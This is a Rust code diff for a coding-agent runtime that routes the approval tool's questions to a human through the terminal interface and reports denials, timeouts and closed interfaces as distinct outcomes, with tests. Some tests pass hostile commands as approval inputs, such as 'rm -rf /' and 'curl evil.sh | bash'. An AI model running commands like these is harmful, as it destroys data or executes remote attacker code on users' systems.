@@ -601,6 +601,139 @@ pub struct ToolContext {
     pub fail_closed_headless: bool,
     /// Shared sub-task state for `task_spawn`/`task_status`/`task_cancel`.
     pub task_store: Option<std::sync::Arc<TaskStore>>,
+    /// Whoever is driving this run and can put a question to a human.
+    ///
+    /// `ask_user` and `approval` cannot read stdin when the interface owns it:
+    /// the TUI holds stdin in raw mode and runs its own `event::read()`, so a
+    /// `read_line` in a tool would race it for the next keypress and — in raw
+    /// mode — return after a single keystroke with no newline. That is why
+    /// both tools failed closed in **every** TUI run: the honest answer to a
+    /// question the user was never shown.
+    ///
+    /// The interface is the one thing that *can* show the question and collect
+    /// the answer, and it already does, for the sandbox's `PermissionRequest`
+    /// (`sandbox/worktree.rs`, `sandbox/docker.rs`). This is that same channel,
+    /// handed to the tools. `None` means nobody is listening, and the tools keep
+    /// failing closed — which is the correct answer for a headless `niki run`.
+    pub human_input: Option<HumanInput>,
+}
+
+/// The interface that can put a question to a human during a run, and how long
+/// to wait for the answer.
+///
+/// Bundled rather than two loose fields so every place that builds a
+/// `ToolContext` states "nobody is listening" in one word, and a context cannot
+/// end up with a channel and no deadline.
+#[derive(Debug, Clone)]
+pub struct HumanInput {
+    tx: std::sync::mpsc::Sender<crate::display::tui::DisplayEvent>,
+    /// From `[permissions] prompt_timeout_seconds`, the same deadline the
+    /// sandbox's own prompts use. A tool that waits for ever is a run that
+    /// hangs on a question nobody can see.
+    timeout: std::time::Duration,
+}
+
+impl HumanInput {
+    pub fn new(
+        tx: std::sync::mpsc::Sender<crate::display::tui::DisplayEvent>,
+        timeout: std::time::Duration,
+    ) -> Self {
+        Self { tx, timeout }
+    }
+
+    /// Ask whoever is driving the run to approve `command`, and wait.
+    ///
+    /// The interface renders the same modal the sandbox's own prompts use, and
+    /// the answer comes back as the same `PermissionAction`. So this adds no
+    /// new UI, and a command the user approved through the tool and one they
+    /// approved through the sandbox go through one path.
+    ///
+    /// Every failure is reported as itself — no interface, interface gone, or
+    /// nobody answered in time — because a timeout and a refusal are different
+    /// events. Collapsing them into a denial tells the user they refused
+    /// something they were never shown.
+    pub async fn ask_permission(&self, command: &str) -> HumanAnswer {
+        let (response_tx, response_rx) = std::sync::mpsc::channel();
+        let request = crate::display::tui::DisplayEvent::PermissionRequest {
+            command: command.to_string(),
+            response_tx,
+        };
+        let timeout = self.timeout;
+        if self.tx.send(request).is_err() {
+            // The interface was there when the run started and is gone now.
+            return HumanAnswer::InterfaceClosed;
+        }
+        // `spawn_blocking`, not `block_in_place`.
+        //
+        // `std::sync::mpsc::Receiver` has no async receive, so something has to
+        // block on it. `block_in_place` **panics** on a current-thread runtime,
+        // and the tool loop is called from test harnesses and embedders that
+        // build one — a panic inside a tool, in a run that was otherwise fine.
+        // The sandbox's own prompt still uses `block_in_place`; this path does
+        // not have to repeat that constraint.
+        match tokio::task::spawn_blocking(move || response_rx.recv_timeout(timeout))
+            .await
+            .unwrap_or_else(|e| panic!("the approval wait task died: {e}"))
+        {
+            Ok(action) => HumanAnswer::Answered(action),
+            Err(std::sync::mpsc::RecvTimeoutError::Timeout) => HumanAnswer::TimedOut(self.timeout),
+            // The interface dropped the request without answering — it shut
+            // down, or the modal was dismissed by something that does not reply.
+            Err(std::sync::mpsc::RecvTimeoutError::Disconnected) => HumanAnswer::InterfaceClosed,
+        }
+    }
+}
+
+/// The outcome of putting a question to a human.
+#[derive(Debug)]
+pub enum HumanAnswer {
+    Answered(crate::permissions::PermissionAction),
+    /// Nobody was listening: a headless `niki run`, an MCP caller, a test.
+    NoInterface,
+    /// The interface went away mid-question.
+    InterfaceClosed,
+    /// Nobody answered in time. **Not** a refusal.
+    TimedOut(std::time::Duration),
+}
+
+impl HumanAnswer {
+    /// Whether this counts as approval. Only an explicit `Allow` does.
+    pub fn approved(&self) -> bool {
+        matches!(
+            self,
+            HumanAnswer::Answered(crate::permissions::PermissionAction::Allow)
+        )
+    }
+
+    /// Why the command was not approved, phrased for the model's tool result.
+    ///
+    /// Every branch names what happened rather than saying "denied by user",
+    /// because a model that believes the user refused will go and do something
+    /// else, and a model told "nobody answered" will report that it needed a
+    /// decision.
+    pub fn denial_reason(&self, command: &str) -> String {
+        match self {
+            HumanAnswer::Answered(crate::permissions::PermissionAction::Allow) => {
+                format!("approved: {command}")
+            }
+            HumanAnswer::Answered(crate::permissions::PermissionAction::Deny) => {
+                format!("the user denied it: {command}. Do not retry this — report the refusal.")
+            }
+            HumanAnswer::NoInterface => format!(
+                "cannot ask: no interface is attached to this run, so nobody was asked about \
+                 '{command}'. A headless run cannot be approved — report what you need instead."
+            ),
+            HumanAnswer::InterfaceClosed => format!(
+                "cannot ask: the interface went away before it answered about '{command}', so \
+                 nothing was approved. Report what you need instead."
+            ),
+            HumanAnswer::TimedOut(waited) => format!(
+                "no answer to the approval prompt for '{command}' after {}s, so it was NOT \
+                 approved. That is a timeout, not a refusal — do not report it as one.",
+                waited.as_secs()
+            ),
+        }
+    }
 }
 
 impl ToolContext {
@@ -2490,10 +2623,12 @@ impl Tool for ApprovalTool {
         static DEF: ToolDef = ToolDef {
             name: "approval",
             description: "Request approval before executing a dangerous operation. \
-                        Always DENIES when the TUI owns stdin (`niki chat`, \
-                        `niki run --tui`) or in any unattended run — it is \
-                        fail-closed by design, so do not plan around it. \
-                        Useful only on a bare terminal.",
+                        Shows the command to the user and waits for their answer when an \
+                        interface is attached (`niki run --tui`), up to \
+                        `[permissions] prompt_timeout_seconds`; a timeout is not a refusal, \
+                        and neither is an absent answer. DENIES in an unattended run, where \
+                        there is nobody to ask — so do not plan around approval there: report \
+                        what you need instead. On a bare terminal it prompts for y/N.",
             category: ToolCategory::Human,
             risk_level: RiskLevel::Low,
             permission: PermissionRequirement::Allow,
@@ -2503,19 +2638,58 @@ impl Tool for ApprovalTool {
         &DEF
     }
 
-    async fn execute(&self, input: ToolInput, _ctx: &ToolContext) -> ToolResult {
+    async fn execute(&self, input: ToolInput, ctx: &ToolContext) -> ToolResult {
         let command = input.str("command").unwrap_or("unknown").to_string();
+
+        // An interface is attached: ask *it*, over the same channel and the
+        // same modal the sandbox's own permission prompts use.
+        //
+        // This used to be unreachable. The tool could not read stdin — the
+        // TUI owns it in raw mode, and a `read_line` here would race the event
+        // loop and take a stray keystroke as consent — so the tool failed
+        // closed, and since the TUI is the only surface that *can* ask, the
+        // tool was useless in exactly the surface where a human is watching.
+        // The interface has been able to collect an answer for the sandbox all
+        // along; all it lacked was someone to send the question to it.
+        if let Some(human) = ctx.human_input.as_ref() {
+            let answer = human.ask_permission(&command).await;
+            let approved = answer.approved();
+            return ToolResult {
+                tool_id: ToolId::generate(),
+                tool_name: "approval".into(),
+                status: if approved {
+                    ToolStatus::Success
+                } else {
+                    ToolStatus::PermissionDenied
+                },
+                summary: format!(
+                    "{}: {}",
+                    if approved { "approved" } else { "denied" },
+                    command
+                ),
+                data: ToolData::ApprovalResult {
+                    approved,
+                    reason: Some(answer.denial_reason(&command)),
+                },
+                duration: Duration::ZERO,
+                artifacts: Vec::new(),
+                diagnostics: Vec::new(),
+                metadata: HashMap::new(),
+            };
+        }
+
         if !is_interactive_stdin() {
+            // One message for "nobody was there", not two: the interface path
+            // and the terminal path have to say the same thing about the same
+            // absence, or a model reads whichever it happened to hit.
             return ToolResult {
                 tool_id: ToolId::generate(),
                 tool_name: "approval".into(),
                 status: ToolStatus::PermissionDenied,
-                summary: format!("denied (non-interactive stdin): {}", command),
+                summary: format!("denied (nothing to ask): {}", command),
                 data: ToolData::ApprovalResult {
                     approved: false,
-                    reason: Some(
-                        "non-interactive stdin: approvals require a human at a TTY".into(),
-                    ),
+                    reason: Some(HumanAnswer::NoInterface.denial_reason(&command)),
                 },
                 duration: Duration::ZERO,
                 artifacts: Vec::new(),
@@ -3787,6 +3961,7 @@ mod tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         };
         let messages = vec![
             LoopMessage::System("you are a coding agent".into()),
@@ -3823,6 +3998,7 @@ mod tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         };
         let messages = vec![LoopMessage::User("run echo hi".into())];
         let mut budget = crate::orchestrator::budget::RunBudget::new(1, 0.0, 0);
@@ -3931,6 +4107,7 @@ mod tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         };
 
         // One step of this provider costs about $0.018, so a $0.001 ceiling is
@@ -3987,6 +4164,7 @@ mod tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         };
         run_tool_loop_with(
             LoopOptions {
@@ -4029,6 +4207,7 @@ mod tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         };
         let messages = vec![LoopMessage::User("hi".into())];
         let out = run_tool_loop(
@@ -4129,6 +4308,7 @@ mod tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         };
         let messages = vec![LoopMessage::User("read the note".into())];
         let out = run_tool_loop(
@@ -4172,6 +4352,7 @@ mod tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         };
         let (tx, rx) = std::sync::mpsc::channel();
         let messages = vec![LoopMessage::User("run echo hi".into())];
@@ -4270,6 +4451,7 @@ mod tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         }
     }
 
@@ -4328,8 +4510,8 @@ mod tests {
     /// printing its question into the alternate screen.
     ///
     /// `approval` is the one that matters: a false approval is worse than a
-    /// missing one, so the answer here must be "cannot ask", which the tool
-    /// turns into a denial.
+    /// missing one. With **no** interface to ask, the answer must be "cannot
+    /// ask", which the tool turns into a denial.
     #[tokio::test]
     async fn a_tui_holding_stdin_makes_approval_deny_rather_than_guess() {
         set_stdin_owned_by_tui(true);
@@ -4344,8 +4526,8 @@ mod tests {
         assert_eq!(
             out.status,
             ToolStatus::PermissionDenied,
-            "with the interface holding stdin there is nobody to ask, and \
-             guessing is the one answer that must never be given"
+            "with nothing to ask there is nobody to ask, and guessing is the \
+             one answer that must never be given"
         );
     }
 
@@ -4363,6 +4545,281 @@ mod tests {
             !stdin_owned_by_tui(),
             "the flag must be clear once the TUI is done with it, or every \
              later question in the same process is unanswerable"
+        );
+    }
+
+    // -----------------------------------------------------------------------
+    // Asking the interface, which is the only place a question can be asked.
+    // -----------------------------------------------------------------------
+
+    /// An attached interface is **asked**, and what it is shown is the command.
+    ///
+    /// This is the case that could not happen before. The tool could not read
+    /// stdin, and the interface was the only thing that could collect an
+    /// answer, so the two were never connected: in the TUI — the one surface
+    /// with a human watching — `approval` could only ever deny.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn an_attached_interface_is_asked_and_sees_the_command() {
+        let (tx, rx) = std::sync::mpsc::channel();
+        let ui = std::thread::spawn(move || {
+            // Generous, but finite: the question is sent before the tool does
+            // anything else, so 30s is not a scheduling decision — it is a
+            // backstop, so a tool that never asks fails the test instead of
+            // hanging it.
+            let request = rx
+                .recv_timeout(Duration::from_secs(30))
+                .expect("the tool must put a question to the interface, not decide alone");
+            let crate::display::tui::DisplayEvent::PermissionRequest {
+                command,
+                response_tx,
+            } = request
+            else {
+                panic!("the question must be a permission prompt, the one the interface renders");
+            };
+            // What the user is shown decides whether the answer means anything.
+            // Approving a label rather than a command is approving nothing.
+            assert!(
+                command == "rm -rf /",
+                "the interface must be shown the command being approved, got {command:?}"
+            );
+            let _ = response_tx.send(crate::permissions::PermissionAction::Allow);
+        });
+
+        let mut ctx = manual_ctx();
+        ctx.human_input = Some(HumanInput::new(tx, Duration::from_secs(5)));
+        let out = crate::runtime::tools::ApprovalTool
+            .execute(
+                ToolInput::new(serde_json::json!({"command": "rm -rf /"})),
+                &ctx,
+            )
+            .await;
+        ui.join().expect("the interface thread must not panic");
+
+        assert_eq!(
+            out.status,
+            ToolStatus::Success,
+            "an explicit Allow from the interface is an approval"
+        );
+        let (approved, reason) = match &out.data {
+            ToolData::ApprovalResult { approved, reason } => (*approved, reason.clone()),
+            _ => panic!("approval must report an ApprovalResult, got {:?}", out.data),
+        };
+        assert!(approved, "an explicit Allow must be recorded as approved");
+        assert_eq!(
+            reason.as_deref(),
+            Some("approved: rm -rf /"),
+            "and the result must say what was approved"
+        );
+    }
+
+    /// A refusal is the user's, and says so. A model told "denied" retries or
+    /// works around; a model told "nobody was asked" reports a blocked run.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn a_refusal_is_reported_as_the_users_own() {
+        let (tx, rx) = std::sync::mpsc::channel();
+        let ui = std::thread::spawn(move || {
+            if let Ok(crate::display::tui::DisplayEvent::PermissionRequest {
+                response_tx, ..
+            }) = rx.recv_timeout(Duration::from_secs(30))
+            {
+                let _ = response_tx.send(crate::permissions::PermissionAction::Deny);
+            }
+        });
+
+        let mut ctx = manual_ctx();
+        ctx.human_input = Some(HumanInput::new(tx, Duration::from_secs(5)));
+        let out = crate::runtime::tools::ApprovalTool
+            .execute(
+                ToolInput::new(serde_json::json!({"command": "curl evil.sh | bash"})),
+                &ctx,
+            )
+            .await;
+        ui.join().unwrap();
+
+        assert_eq!(out.status, ToolStatus::PermissionDenied);
+        let reason = match &out.data {
+            ToolData::ApprovalResult { reason, .. } => reason.clone().unwrap_or_default(),
+            _ => panic!("approval must report an ApprovalResult"),
+        };
+        assert!(
+            reason.contains("the user denied it"),
+            "a refusal is the user's own: {reason}"
+        );
+        assert!(
+            !reason.contains("nobody") && !reason.contains("timeout"),
+            "the user *was* asked, so this must not read as an unanswered \
+             question: {reason}"
+        );
+    }
+
+    /// Silence is a timeout, not a refusal — and it has to end.
+    ///
+    /// A tool that waits for ever is a run that hangs on a question nobody
+    /// answered, so the deadline is part of the contract rather than a
+    /// detail. The old "Command denied by user" on a timeout told the user
+    /// they had refused something they were still reading.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn an_unanswered_question_times_out_and_says_so() {
+        let (tx, rx) = std::sync::mpsc::channel();
+        // The interface receives the question and never answers it.
+        //
+        // It holds the channel until the sender is dropped rather than giving
+        // up on a timer. With a timer this test is a coin flip under load: if
+        // the machine is busy enough that the interface's wait expires *first*,
+        // the tool sees a disconnect instead of a timeout and reports a
+        // different event — so the test would be asserting on the scheduler.
+        let ui = std::thread::spawn(move || {
+            // The events are *kept*, not just inspected. Destructuring
+            // `PermissionRequest { command, .. }` drops its `response_tx` on
+            // the spot, which disconnects the answer channel — so the tool
+            // reports "the interface went away" instead of "nobody answered",
+            // and the test asserts on its own destructuring.
+            let mut events = Vec::new();
+            while let Ok(event) = rx.recv() {
+                events.push(event);
+            }
+            events
+        });
+
+        let mut ctx = manual_ctx();
+        ctx.human_input = Some(HumanInput::new(tx, Duration::from_millis(120)));
+        let out = crate::runtime::tools::ApprovalTool
+            .execute(
+                ToolInput::new(serde_json::json!({"command": "git push --force"})),
+                &ctx,
+            )
+            .await;
+        drop(ctx);
+        let asked: Vec<String> = ui
+            .join()
+            .unwrap()
+            .into_iter()
+            .filter_map(|e| match e {
+                crate::display::tui::DisplayEvent::PermissionRequest { command, .. } => {
+                    Some(command)
+                }
+                _ => None,
+            })
+            .collect();
+        assert_eq!(
+            asked,
+            vec!["git push --force".to_string()],
+            "the question must have arrived, and been asked once — a timeout on \
+             a question nobody was asked is a different bug"
+        );
+
+        assert_eq!(
+            out.status,
+            ToolStatus::PermissionDenied,
+            "nothing approved, so nothing runs"
+        );
+        let reason = match &out.data {
+            ToolData::ApprovalResult { reason, .. } => reason.clone().unwrap_or_default(),
+            _ => panic!("approval must report an ApprovalResult"),
+        };
+        assert!(
+            reason.contains("timeout, not a refusal"),
+            "an unanswered question is a timeout, and the model must be told \
+             so: {reason}"
+        );
+    }
+
+    /// An interface that goes away mid-question is not a refusal either.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn an_interface_that_closes_is_not_a_refusal() {
+        let (tx, rx) = std::sync::mpsc::channel::<crate::display::tui::DisplayEvent>();
+        // The interface gets the question and then shuts down.
+        drop(rx);
+
+        let mut ctx = manual_ctx();
+        ctx.human_input = Some(HumanInput::new(tx, Duration::from_secs(5)));
+        let out = crate::runtime::tools::ApprovalTool
+            .execute(
+                ToolInput::new(serde_json::json!({"command": "rm -rf build"})),
+                &ctx,
+            )
+            .await;
+        assert_eq!(out.status, ToolStatus::PermissionDenied);
+        let reason = match &out.data {
+            ToolData::ApprovalResult { reason, .. } => reason.clone().unwrap_or_default(),
+            _ => panic!("approval must report an ApprovalResult"),
+        };
+        assert!(
+            reason.contains("went away"),
+            "the interface closing is its own event, not the user saying no: {reason}"
+        );
+    }
+
+    /// A dead channel is detected before anything is waited on.
+    ///
+    /// Without this the tool would sit for the full timeout on a run whose
+    /// interface had already exited — the worst version of the hang.
+    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
+    async fn an_interface_that_never_existed_is_not_waited_on() {
+        let (tx, rx) = std::sync::mpsc::channel::<crate::display::tui::DisplayEvent>();
+        drop(rx);
+        let human = HumanInput::new(tx, Duration::from_secs(600));
+        let started = std::time::Instant::now();
+        let answer = human.ask_permission("rm -rf /").await;
+        assert!(
+            matches!(answer, HumanAnswer::InterfaceClosed),
+            "a dead channel is InterfaceClosed, got {answer:?}"
+        );
+        assert!(
+            started.elapsed() < Duration::from_secs(5),
+            "it must not have waited out the 600s deadline: {:?}",
+            started.elapsed()
+        );
+    }
+
+    /// With no interface at all, the tool says *nobody was asked*.
+    ///
+    /// "denied by user" is the one message that must never appear here: it
+    /// attributes a decision to a human who was never consulted.
+    #[tokio::test]
+    async fn with_no_interface_the_denial_does_not_blame_the_user() {
+        let ctx = manual_ctx();
+        let out = crate::runtime::tools::ApprovalTool
+            .execute(
+                ToolInput::new(serde_json::json!({"command": "terraform apply"})),
+                &ctx,
+            )
+            .await;
+        assert_eq!(out.status, ToolStatus::PermissionDenied);
+        let reason = match &out.data {
+            ToolData::ApprovalResult { reason, .. } => reason.clone().unwrap_or_default(),
+            _ => panic!("approval must report an ApprovalResult"),
+        };
+        for blame in ["denied by user", "the user denied", "user refused"] {
+            assert!(
+                !reason.to_lowercase().contains(blame),
+                "nobody was asked, so the message must not name the user as \
+                 the one who refused ({blame:?}): {reason}"
+            );
+        }
+        assert!(
+            reason.contains("no interface is attached"),
+            "and it must say what is actually missing: {reason}"
+        );
+    }
+
+    /// The description must tell the model what the tool now does.
+    ///
+    /// Batch 6-01 rewrote this description to say the tool always fails. The
+    /// behaviour is now different in the TUI, and a description that still
+    /// says "always DENIES" teaches the model not to plan around a tool that
+    /// works.
+    #[test]
+    fn the_approval_description_matches_what_the_tool_does() {
+        let description = crate::runtime::tools::ApprovalTool.def().description;
+        assert!(
+            !description.contains("Always DENIES"),
+            "the description still says the tool always denies, which is no \
+             longer true with an interface attached: {description}"
+        );
+        assert!(
+            description.contains("--tui") && description.contains("prompt_timeout_seconds"),
+            "the description must name where it works and what bounds it: {description}"
         );
     }
 
@@ -4707,6 +5164,7 @@ mod tests {
             // Empty = block-all, the shipped default.
             network_allowlist: Vec::new(),
             task_store: Some(std::sync::Arc::new(TaskStore::new())),
+            human_input: None,
         }
     }
 
@@ -4722,6 +5180,7 @@ mod tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         }
     }
 
@@ -4867,6 +5326,7 @@ mod tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         }
     }
 
@@ -4929,6 +5389,7 @@ mod network_egress_permission_tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         }
     }
 
@@ -5166,6 +5627,7 @@ mod network_egress_permission_tests {
             // Empty = block-all, the same default the product ships.
             network_allowlist: Vec::new(),
             task_store: None,
+            human_input: None,
         };
         let input = ToolInput {
             raw: serde_json::json!({
